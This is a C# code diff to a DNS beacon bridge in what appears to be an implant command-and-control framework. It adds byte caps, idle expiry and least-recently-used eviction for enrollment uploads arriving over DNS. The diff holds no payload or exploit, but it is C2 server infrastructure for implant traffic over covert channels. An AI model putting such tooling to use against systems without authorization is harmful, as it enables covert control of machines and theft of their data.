@@ -78,6 +78,12 @@ internal sealed class DnsBeaconBridge
     private const int MaxEnrollStreams = 32;
     private const int MaxEnrollAnswers = 64;
 
+    // One upload stream's byte ceiling and idle window: a legitimate
+    // enrollment body is kilobytes and completes within a few query
+    // rounds, so past either bound the stream is debris, not an enroll.
+    private const int MaxEnrollStreamBytes = 64 * 1024;
+    private static readonly TimeSpan EnrollStreamIdle = TimeSpan.FromMinutes(5);
+
     // The delivery ledger's bound: confirmed blobs keyed by task and sha,
     // pruned oldest-first. Generous against a fleet's in-flight reports
     // while a spoofed probe flood cannot pin memory.
@@ -89,7 +95,7 @@ internal sealed class DnsBeaconBridge
     private readonly ILiveEventBus _bus;
     private readonly TimeProvider _clock;
     private readonly BeaconTasking _tasking;
-    private readonly DnsContactNames.ResultReassembler _results = new();
+    private readonly DnsContactNames.ResultReassembler _results;
     private readonly EnrollmentService _enrollment;
     private readonly Rod.CoreState.Deployment.IDeployTokenService _tokens;
     private readonly Rod.Audit.IPayloadStore _payloads;
@@ -98,11 +104,19 @@ internal sealed class DnsBeaconBridge
     private readonly IImplantRepository _implants;
     private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
     private readonly BeaconIngest _ingest;
-    private readonly DnsContactNames.ResultReassembler _channelOutputs = new();
+    private readonly DnsContactNames.ResultReassembler _channelOutputs;
     private readonly object _enrollGate = new();
-    private readonly Dictionary<string, List<byte[]>> _enrollUploads = new();
+    private readonly Dictionary<string, EnrollUpload> _enrollUploads = new();
     private readonly Dictionary<string, byte[]> _enrollAnswers = new();
     private readonly List<string> _enrollAnswerOrder = new();
+
+    // One enrollment upload in flight: its chunks in arrival order and the
+    // last-chunk stamp the idle window and the stream cap evict by.
+    private sealed class EnrollUpload
+    {
+        public List<byte[]> Parts = new();
+        public DateTimeOffset Touched;
+    }
 
     // The delivery ledger (the n.-probe's state): terminal reassemblies
     // that reached recording, keyed task+sha. In-memory like the enroll
@@ -142,6 +156,8 @@ internal sealed class DnsBeaconBridge
         _implants = implants;
         _degraded = degraded;
         _ingest = ingest;
+        _results = new DnsContactNames.ResultReassembler(clock);
+        _channelOutputs = new DnsContactNames.ResultReassembler(clock);
     }
 
     /// <summary>
@@ -161,29 +177,49 @@ internal sealed class DnsBeaconBridge
         CancellationToken cancellationToken)
     {
         var key = DnsContactNames.Encode(stream);
-        List<byte[]> parts;
+        EnrollUpload upload;
         lock (_enrollGate)
         {
+            var now = _clock.GetUtcNow();
+            // An upload that stopped mid-sequence leaves on idle -- a
+            // dropped enrollment and spoofed debris alike, never on a
+            // terminal that may never come.
+            foreach (var stale in _enrollUploads
+                         .Where(kv => now - kv.Value.Touched > EnrollStreamIdle)
+                         .Select(kv => kv.Key)
+                         .ToArray())
+            {
+                _enrollUploads.Remove(stale);
+            }
+
             if (!_enrollUploads.TryGetValue(key, out var found))
             {
-                if (_enrollUploads.Count >= MaxEnrollStreams)
+                // The stream cap pushes out the least recently touched
+                // upload so a full map still admits the stream in hand.
+                while (_enrollUploads.Count >= MaxEnrollStreams)
                 {
-                    var oldestUpload = _enrollUploads.Keys.First();
-                    _enrollUploads.Remove(oldestUpload);
+                    var lru = _enrollUploads.Aggregate((a, b) => a.Value.Touched <= b.Value.Touched ? a : b).Key;
+                    _enrollUploads.Remove(lru);
                 }
-                parts = new List<byte[]>();
-                _enrollUploads[key] = parts;
+                found = new EnrollUpload();
+                _enrollUploads[key] = found;
             }
-            else
-            {
-                parts = found;
-            }
+            upload = found;
+            upload.Touched = now;
+            var parts = upload.Parts;
             // In-order, or a retransmit of the last chunk (the ack it rode
             // may have been lost); anything else restarts the stream.
             if (sequence == parts.Count)
                 parts.Add(chunk);
             else if (sequence != parts.Count - 1)
                 return null;
+            // One stream's byte ceiling: a legitimate enrollment body is
+            // kilobytes, so anything past the cap is debris pinning memory.
+            if (parts.Sum(p => p.Length) > MaxEnrollStreamBytes)
+            {
+                _enrollUploads.Remove(key);
+                return null;
+            }
         }
 
         if (!terminal)
@@ -192,12 +228,12 @@ internal sealed class DnsBeaconBridge
         byte[] body;
         lock (_enrollGate)
         {
-            if (!_enrollUploads.Remove(key, out var assembled) || assembled is null)
+            if (!_enrollUploads.Remove(key, out var assembled))
                 return null;
-            var total = assembled.Sum(p => p.Length);
+            var total = assembled.Parts.Sum(p => p.Length);
             body = new byte[total];
             var offset = 0;
-            foreach (var part in assembled)
+            foreach (var part in assembled.Parts)
             {
                 part.CopyTo(body, offset);
                 offset += part.Length;
